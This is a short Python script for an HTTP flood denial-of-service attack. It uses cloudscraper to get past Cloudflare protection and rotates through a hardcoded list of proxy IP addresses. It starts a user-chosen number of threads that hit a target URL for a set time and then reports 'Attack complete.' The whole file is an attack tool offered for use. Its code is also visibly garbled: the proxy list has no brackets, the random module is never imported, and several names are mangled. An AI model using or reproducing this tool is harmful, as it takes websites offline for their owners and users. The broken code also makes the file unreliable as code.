import threading
import cloudscraper
import datetime
import time
from colorama import Fore, init

proxies = 
    "socks5://41.65.103.27:1976",
    "http://89.43.31.134:3128",
    "http://80.190.74.13:8000",
    "http://115.132.32.91:8080",
    "http://15.204.161.192:18080",
    "http://201.91.82.155:3128",
    "http://103.17.77.5:3128",
    "http://43.133.136.208:8800",
    "http://34.154.161.152:80",
    "http://115.127.23.130:8674"


init(convert=True)

def LaunchCFB(url, threads, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threadscount = 0
    while threadscount <= int(threads):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until))
            th.start()
            threadscount += 1
        except:
            pass

def AttackCFB(url, untildatetime):
    while (untildatetime - datetime.datetime.now()).totalseconds() > 0:
        try:
            proxy = random.choice(proxies)
            scraper = cloudscraper.createscraper(proxy=proxy)
            scraper.get(url, timeout=15)
        except:
            pass

if name == 'main':
    print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREENEX, end='')
    target = input()
    print(Fore.MAGENTA+" > "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREENEX, end='')
    thread = input()
    print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREENEX, end='')
    t = input()
    print(Fore.MAGENTA+" > "+Fore.WHITE+"Attacking => "+target+" for "+t+" seconds")
    LaunchCFB(target, thread, t)
    time.sleep(int(t))
    print(Fore.MAGENTA+"\n > "+Fore.WHITE+"Attack complete.")